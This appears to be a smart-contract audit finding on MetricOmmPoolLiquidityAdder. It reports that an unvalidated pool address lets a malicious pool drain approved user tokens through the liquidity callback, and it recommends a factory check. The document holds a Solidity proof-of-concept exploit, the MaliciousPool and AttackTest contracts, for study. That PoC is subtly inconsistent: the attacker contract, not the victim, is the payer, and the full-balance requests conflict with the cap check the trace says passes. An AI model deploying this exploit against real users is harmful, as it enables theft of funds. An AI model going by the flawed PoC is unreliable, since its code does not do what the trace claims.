### Title
Unvalidated `pool` Parameter in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Approved User Tokens via Callback - (`File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address without validating it against the factory registry. A malicious contract passed as `pool` becomes the trusted callback caller, allowing it to invoke `metricOmmModifyLiquidityCallback` and drain up to `maxAmountToken0` / `maxAmountToken1` of any tokens from the victim's wallet through the `pay()` helper.

---

### Finding Description

`MetricOmmPoolLiquidityAdder` explicitly documents that it skips factory validation:

> *"The caller is responsible for supplying a legitimate pool address and other non-malicious parameters. This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."* [1](#0-0) 

Every entry point (`addLiquidityExactShares`, `addLiquidityWeighted`) passes the raw caller-supplied `pool` directly into `_addLiquidity`, which stores it as the authorised callback caller in transient storage: [2](#0-1) [3](#0-2) 

The callback then authenticates the caller solely by comparing `msg.sender` to the stored `expectedPool` — which is the attacker-controlled address: [4](#0-3) 

After passing that check, the callback queries `IMetricOmmPool(msg.sender).getImmutables()` to obtain `token0`/`token1`, then calls `pay(token0, payer, msg.sender, amount0Delta)` and `pay(token1, payer, msg.sender, amount1Delta)`: [5](#0-4) 

Because the malicious pool controls both the `getImmutables()` return values and the `amount0Delta`/`amount1Delta` it reports in the callback, it can specify any token addresses and request up to the victim's stated caps.

By contrast, `MetricOmmSwapRouterBase._setNextCallbackContext` always calls `_requireFactoryPool(pool)` before storing any pool in transient context, making the router immune to this class of attack: [6](#0-5) [7](#0-6) 

---

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` for any ERC-20 token (a prerequisite for normal use) and is tricked into calling any `addLiquidity*` variant with a malicious `pool` address loses up to `maxAmountToken0` of one token and `maxAmountToken1` of another token in a single transaction. The attacker receives those tokens directly at the malicious pool address. This is a direct, irreversible loss of user principal with no protocol-level recovery path.

---

### Likelihood Explanation

The `MetricOmmPoolLiquidityAdder` is a shared periphery contract that users must pre-approve for large token amounts before adding liquidity. Once approved, a single phishing transaction (e.g., a spoofed UI presenting a fake pool address) is sufficient to trigger the drain. No privileged access, no special token behaviour, and no complex setup is required beyond deploying a ~30-line malicious contract. The attack is replayable against every victim who has an outstanding approval.

---

### Recommendation

Add factory validation to every `addLiquidity*` entry point, mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// In MetricOmmPoolLiquidityAdder constructor, store the factory:
IMetricOmmPoolFactory internal immutable FACTORY;

constructor(address weth, address factory) PeripheryPayments(weth) {
    if (factory == address(0)) revert InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
}

// In _addLiquidity (and the weighted probe path), add before _setPayContext:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This is the same guard used by `MetricOmmSwapRouterBase._requireFactoryPool` and eliminates the entire attack surface at negligible gas cost (one `SLOAD` of an immutable).

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmPoolLiquidityAdder} from
    "metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Malicious pool that drains victim tokens through the liquidity adder callback.
contract MaliciousPool {
    address immutable adder;
    address immutable stealToken0;
    address immutable stealToken1;
    address immutable victim;

    constructor(address _adder, address _t0, address _t1, address _victim) {
        adder = _adder;
        stealToken0 = _t0;
        stealToken1 = _t1;
        victim = _victim;
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external
        returns (uint256, uint256)
    {
        // Trigger callback: request full caps from victim
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            IERC20(stealToken0).balanceOf(victim),   // amount0Delta = victim's full balance
            IERC20(stealToken1).balanceOf(victim),   // amount1Delta = victim's full balance
            abi.encode(uint8(1))                     // KIND_PAY
        );
        return (0, 0);
    }

    // Called by the adder callback to resolve token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = stealToken0;
        imm.token1 = stealToken1;
    }
}

contract AttackTest {
    function run(
        address adder,
        address token0,
        address token1,
        address victim,
        uint256 maxAmt0,
        uint256 maxAmt1
    ) external {
        MaliciousPool mp = new MaliciousPool(adder, token0, token1, victim);

        LiquidityDelta memory deltas;
        deltas.binIdxs = new int256[](1);
        deltas.shares  = new uint256[](1);
        deltas.binIdxs[0] = 0;
        deltas.shares[0]  = 1;

        // Victim must have approved `adder` for token0 and token1 (normal prerequisite).
        // Attacker tricks victim into calling this with mp as the pool.
        // Result: victim loses up to maxAmt0 of token0 and maxAmt1 of token1.
        IMetricOmmPoolLiquidityAdder(adder).addLiquidityExactShares(
            address(mp),  // <-- malicious pool, not factory-registered
            victim,
            0,
            deltas,
            maxAmt0,
            maxAmt1,
            ""
        );

        // Attacker now holds victim's tokens at address(mp).
    }
}
```

**Execution trace:**
1. `addLiquidityExactShares(mp, victim, ...)` → `_addLiquidity` → `_setPayContext(mp, victim, maxAmt0, maxAmt1)`
2. `IMetricOmmPoolActions(mp).addLiquidity(...)` → `MaliciousPool.addLiquidity` executes
3. Malicious pool calls `adder.metricOmmModifyLiquidityCallback(victimBal0, victimBal1, KIND_PAY)`
4. Callback: `msg.sender (mp) == expectedPool (mp)` ✓ — guard passes
5. `mp.getImmutables()` returns attacker-chosen `token0`, `token1`
6. `pay(token0, victim, mp, victimBal0)` → `safeTransferFrom(victim, mp, victimBal0)` ✓
7. `pay(token1, victim, mp, victimBal1)` → `safeTransferFrom(victim, mp, victimBal1)` ✓
8. Victim's tokens are now at `mp`; attacker withdraws them.

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-196)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```
